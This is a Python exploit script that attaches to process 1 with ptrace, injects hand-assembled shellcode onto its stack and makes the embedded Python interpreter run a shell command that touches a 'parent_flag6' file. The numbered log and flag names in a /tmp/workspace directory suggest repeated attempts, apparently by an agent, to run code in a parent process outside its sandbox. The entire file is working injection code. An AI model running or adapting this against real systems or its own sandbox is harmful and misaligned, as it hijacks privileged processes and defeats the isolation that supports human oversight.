import ctypes, os, struct
PID=1
LOG=open('/tmp/workspace/injlog6.txt','w',buffering=1)
def log(*a): print(*a,file=LOG,flush=True)
PTRACE_ATTACH=16; PTRACE_DETACH=17; PTRACE_PEEKDATA=2; PTRACE_POKEDATA=5
PTRACE_GETREGS=12; PTRACE_SETREGS=13; PTRACE_CONT=7
class R(ctypes.Structure):
    _fields_=[(x,ctypes.c_ulonglong) for x in 'r15 r14 r13 r12 rbp rbx r11 r10 r9 r8 rax rcx rdx rsi rdi orig_rax rip cs eflags rsp ss fs_base gs_base ds es fs gs'.split()]
libc=ctypes.CDLL(None,use_errno=True); libc.ptrace.restype=ctypes.c_long
libc.ptrace.argtypes=[ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p]
libc.waitpid.argtypes=[ctypes.c_int,ctypes.POINTER(ctypes.c_int),ctypes.c_int]; libc.waitpid.restype=ctypes.c_int
def pt(req,addr=0,data=0):
    r=libc.ptrace(req,PID,ctypes.c_void_p(addr),ctypes.c_void_p(data))
    if r==-1:
        e=ctypes.get_errno(); raise OSError(e,os.strerror(e))
    return r
def wait_stop():
    st=ctypes.c_int()
    if libc.waitpid(PID,ctypes.byref(st),0)<0:
        e=ctypes.get_errno(); raise OSError(e,os.strerror(e))
    return st.value
def peek(a): return pt(PTRACE_PEEKDATA,a,0)&((1<<64)-1)
def poke(a,v): pt(PTRACE_POKEDATA,a,v&((1<<64)-1))
def write_bytes(a,d):
    start=a&~7; end=(a+len(d)+7)&~7; b=bytearray()
    for x in range(start,end,8): b+=struct.pack('<Q',peek(x))
    off=a-start; b[off:off+len(d)]=d
    for i,x in enumerate(range(start,end,8)): poke(x,struct.unpack('<Q',b[i*8:i*8+8])[0])
def map_base(pid,name):
    for x in open(f'/proc/{pid}/maps'):
        if name in x and 'r--p' in x: return int(x.split('-',1)[0],16)
    raise RuntimeError('no '+name)
base=map_base(1,'libpython3.12'); lo,hi=[int(x,16) for x in next(x for x in open('/proc/1/maps') if '[stack]' in x).split()[0].split('-')]
code=lo+0x10000; msg=lo+0x11000; result=lo+0x12000; newstack=lo+0x8000
text=("import os\nos.system('touch /tmp/workspace/parent_flag6')\n\0").encode()
ens=base+0x2d2630; run=base+0x2b1e70; rel=base+0x2d4450
sc=(b'\x48\xb8'+struct.pack('<Q',ens)+b'\xff\xd0'+b'\x48\xbb'+struct.pack('<Q',result)+b'\x48\x89\x03'+b'\x49\x89\xc4'+b'\x48\xbf'+struct.pack('<Q',msg)+b'\x31\xf6'+b'\x48\xb8'+struct.pack('<Q',run)+b'\xff\xd0'+b'\x48\xbb'+struct.pack('<Q',result+8)+b'\x48\x89\x03'+b'\x4c\x89\xe7'+b'\x48\xb8'+struct.pack('<Q',rel)+b'\xff\xd0'+b'\xcc')
log('BASE',hex(base),'STACK',hex(lo),hex(hi),'CODE',hex(code),'MSG',hex(msg),'RESULT',hex(result),'NEWSTACK',hex(newstack),'BYTES',len(sc))
try:
    pt(PTRACE_ATTACH); wait_stop(); orig=R(); pt(PTRACE_GETREGS,0,ctypes.addressof(orig)); log('ORIG',hex(orig.rip),hex(orig.rsp))
    write_bytes(code,sc); write_bytes(msg,text)
    regs=R.from_buffer_copy(orig); regs.rip=code; regs.rsp=newstack
    pt(PTRACE_SETREGS,0,ctypes.addressof(regs)); pt(PTRACE_CONT)
    st=wait_stop(); log('STOP',st,'GILSTATE',peek(result),'PYRUN',peek(result+8))
    pt(PTRACE_SETREGS,0,ctypes.addressof(orig)); pt(PTRACE_DETACH); log('INJECTED')
except Exception as e:
    log('ERROR',repr(e))
    try: pt(PTRACE_DETACH)
    except Exception: pass
    raise
